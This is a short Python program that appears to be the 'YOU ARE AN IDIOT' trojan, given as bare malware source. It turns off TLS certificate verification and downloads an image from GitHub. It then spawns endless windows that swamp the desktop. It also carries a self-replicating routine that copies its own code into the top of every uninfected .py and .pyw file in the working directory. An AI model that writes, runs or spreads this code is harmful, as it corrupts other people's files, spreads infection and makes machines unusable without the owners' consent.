# SCRIPT SAYS HI!

import tkinter as tk
import random
import pip

try:
    from PIL import ImageTk, Image
except ImportError:
    if hasattr(pip, 'main'):
        pip.main(['install', '--user', 'pillow'])
    else:
        import pip._internal
        pip._internal.main(['install', '--user', 'pillow'])
    from PIL import ImageTk, Image
    
from io import BytesIO
import urllib.request as request
import ssl

ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE
root = tk.Tk()

URL="https://raw.githubusercontent.com/MandiYang/YOUAREANIDIOT.PY.TROJAN/master/image/IDIOT.png"
response = request.urlopen(URL, context=ctx)
img_data = response.read()
h=BytesIO(img_data)
open_i=Image.open(h)
imagen = open_i.resize((400, 400), Image.ANTIALIAS)
image = ImageTk.PhotoImage(imagen)

def startInfiniteLoop():
    i = 0
    otherFrame = []
    while True:
        tkl=tk.Toplevel()
        if tkl.winfo_screenwidth() > 1800:
            x = random.randint(-650, 1400)
        elif tkl.winfo_screenwidth() > 1500:
            x = random.randint(-600, 1200)
        elif tkl.winfo_screenwidth() > 1250:
            x = random.randint(-600, 900)
        else:
            x = random.randint(-500, 800)
        y =  random.randint(-550, 550)
        tkl.geometry("+%d+%d" % (x + 400, y + 400))
        tkl.title("YOU ARE AN IDIOT!")
        label = tk.Label(tkl, image=image)
        label.pack(fill="both")
        otherFrame.append(tkl)
        i += 1
        tkl.update()
        if i%500 == 0:
            root.update()
            
import sys
import glob

script_code = []

with open(sys.argv[0], 'r') as f:
    lines = f.readlines()

self_replicating_part = False
for line in lines:
    if line == "# SCRIPT SAYS HI!":
        self_replicating_part = True
    if not self_replicating_part:
        script_code.append(line)
    if line == "# SCRIPT SAYS BYE!\n":
        break

python_files = glob.glob('*.py') + glob.glob('*.pyw')

for file in python_files:
    with open(file, 'r') as f:
        file_code = f.readlines()

    implanted = False

    for line in file_code:
        if line == "# SCRIPT SAYS HI!\n":
            implanted = True
            break

    if not implanted:
        final_code = []
        final_code.extend(script_code)
        final_code.extend('\n')
        final_code.extend(file_code)

        with open(file, 'w') as f:
            f.writelines(final_code)
            
def IDIOT():
    print("YOU ARE AN IDIOT!")

label = tk.Label(root, image=image)
label.pack(fill='both')
IDIOT()
startInfiniteLoop()
root.mainloop()

# SCRIPT SAYS BYE!






